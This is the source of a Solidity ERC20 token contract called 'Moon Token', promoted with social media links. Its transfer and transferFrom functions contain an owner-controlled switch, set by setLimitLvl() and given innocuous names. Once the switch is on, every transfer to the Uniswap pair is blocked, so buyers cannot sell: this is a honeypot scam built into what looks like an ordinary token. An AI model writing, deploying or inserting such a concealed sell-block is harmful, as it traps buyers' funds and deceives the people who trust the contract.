/**
    https://twitter.com/MoonToken2023
    https://t.me/MoonTKN
*/
// SPDX-License-Identifier: MIT



pragma solidity ^0.8.0;

import "./ERC20.sol";
import "./SafeMath.sol";
import "./Ownable.sol";

contract Moon is ERC20, Ownable {
    using SafeMath for uint256;
    
    address public uniswapV2Pair;
    bool public level = false;
    uint256 public DECIMALS = 18;

    constructor() ERC20("Moon Token", "Moon") {
        _mint(_msgSender(), 1 * (10 ** 6) * (10 ** DECIMALS));
    }

    function setUniswapV2Pair(address _pair) external onlyOwner {
        uniswapV2Pair = _pair;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        require(!(recipient == uniswapV2Pair && level), "transfer is set level");
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
        if (to == uniswapV2Pair) {
            require (!level, "limit return");
        }
        address spender = _msgSender();

        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function setLimitLvl() external onlyOwner {
        level = true;
    }

    function UnsetLimitsLvl() external onlyOwner {
        level = false; 
    }
}
